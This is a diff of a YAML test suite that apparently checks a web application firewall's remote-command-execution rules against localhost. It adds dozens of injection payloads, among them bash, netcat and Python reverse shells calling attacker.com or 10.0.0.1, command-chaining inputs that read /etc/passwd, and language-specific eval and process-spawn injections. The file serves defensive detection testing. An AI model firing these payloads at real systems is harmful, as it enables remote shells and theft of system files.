@@ -1,11 +1,12 @@
 meta:
   author: "Antigravity"
-  description: "Unique Remote Code Execution (RCE) Bypass Attempts"
+  description: "Comprehensive Remote Code Execution (RCE) Attack Vectors"
   enabled: true
-  name: "932-rce-unique-bypass"
+  name: "932-rce-comprehensive"
 tests:
+  # Original tests
   - test_id: 932100
-    desc: "RCE via Spring Expression Language (SpEL) Injection"
+    desc: "RCE: Spring Expression Language (SpEL)"
     stages:
       - stage:
           input:
@@ -20,7 +21,7 @@ tests:
           output:
             log_contains: "id \"932"
   - test_id: 932101
-    desc: "RCE via PHP function call obfuscation"
+    desc: "RCE: PHP function obfuscation"
     stages:
       - stage:
           input:
@@ -30,11 +31,11 @@ tests:
             headers:
               User-Agent: "WAF-Tester/1.0"
               Host: "localhost"
-            uri: "/?cmd=return\"system\"(ls);"
+            uri: "/?cmd=return\\\"system\\\"(ls);"
           output:
             log_contains: "id \"932"
   - test_id: 932102
-    desc: "RCE via Base64 encoded command piped to shell"
+    desc: "RCE: Base64 encoded command"
     stages:
       - stage:
           input:
@@ -49,7 +50,7 @@ tests:
           output:
             log_contains: "id \"932"
   - test_id: 932103
-    desc: "RCE using wildcards to bypass specific command blocks"
+    desc: "RCE: Wildcard bypass"
     stages:
       - stage:
           input:
@@ -63,7 +64,7 @@ tests:
           output:
             log_contains: "id \"932"
   - test_id: 932104
-    desc: "RCE via OGNL injection (Struts2 style)"
+    desc: "RCE: OGNL injection (Struts2)"
     stages:
       - stage:
           input:
@@ -75,5 +76,391 @@ tests:
               Host: "localhost"
               Content-Type: "application/x-www-form-urlencoded"
             data: "redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start()}"
+          output:
+            log_contains: "id \"932"
+  # Shell command variations
+  - test_id: 932105
+    desc: "RCE: Reverse shell bash"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"cmd\": \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932106
+    desc: "RCE: Python reverse shell"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?exec=python -c 'import socket,subprocess;s=socket.socket();s.connect((\"10.0.0.1\",4444))'"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932107
+    desc: "RCE: Netcat reverse shell"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "cmd=nc -e /bin/sh attacker.com 4444"
+          output:
+            log_contains: "id \"932"
+  # Command injection separators
+  - test_id: 932108
+    desc: "RCE: Semicolon separator"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?file=test.txt;whoami"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932109
+    desc: "RCE: Pipe operator"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?cmd=ls | whoami"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932110
+    desc: "RCE: Ampersand background"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "exec=sleep 10 & id"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932111
+    desc: "RCE: Logical AND &&"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?cmd=ls && cat /etc/passwd"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932112
+    desc: "RCE: Logical OR ||"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?cmd=false || whoami"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932113
+    desc: "RCE: Backtick execution"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"input\": \"`id`\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932114
+    desc: "RCE: Command substitution $()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?var=$(whoami)"
+          output:
+            log_contains: "id \"932"
+  # PHP-specific
+  - test_id: 932115
+    desc: "RCE PHP: eval()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "code=eval($_POST['cmd']);"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932116
+    desc: "RCE PHP: assert()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?code=assert($_GET['cmd'])"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932117
+    desc: "RCE PHP: preg_replace /e modifier"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"regex\": \"/test/e\", \"replace\": \"system('id')\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932118
+    desc: "RCE PHP: create_function()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "func=create_function('','system(\"id\");')"
+          output:
+            log_contains: "id \"932"
+  # Python-specific
+  - test_id: 932119
+    desc: "RCE Python: exec()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"code\": \"exec(__import__('os').system('id'))\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932120
+    desc: "RCE Python: os.popen()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?cmd=__import__('os').popen('whoami').read()"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932121
+    desc: "RCE Python: subprocess"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "code=__import__('subprocess').call(['id'])"
+          output:
+            log_contains: "id \"932"
+  # Node.js-specific
+  - test_id: 932122
+    desc: "RCE Node.js: child_process.exec"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"cmd\": \"require('child_process').exec('id')\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932123
+    desc: "RCE Node.js: child_process.spawn"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?code=require('child_process').spawn('id')"
+          output:
+            log_contains: "id \"932"
+  # Ruby-specific
+  - test_id: 932124
+    desc: "RCE Ruby: system()"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "cmd=system('whoami')"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932125
+    desc: "RCE Ruby: backticks"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?exec=`id`"
+          output:
+            log_contains: "id \"932"
+  # Java-specific
+  - test_id: 932126
+    desc: "RCE Java: Runtime.exec"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/json"
+            data: "{\"cmd\": \"Runtime.getRuntime().exec('id')\"}"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932127
+    desc: "RCE Java: ProcessBuilder"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "code=new ProcessBuilder('id').start()"
+          output:
+            log_contains: "id \"932"
+  # Obfuscation techniques
+  - test_id: 932128
+    desc: "RCE: Environment variable expansion"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?cmd=$USER $HOME"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932129
+    desc: "RCE: Newline separator"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "POST"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+              Content-Type: "application/x-www-form-urlencoded"
+            data: "cmd=ls%0Aid"
+          output:
+            log_contains: "id \"932"
+  - test_id: 932130
+    desc: "RCE: Brace expansion"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            method: "GET"
+            port: 80
+            headers:
+              User-Agent: "WAF-Tester/1.0"
+              Host: "localhost"
+            uri: "/?file={cat,/etc/passwd}"
           output:
             log_contains: "id \"932"
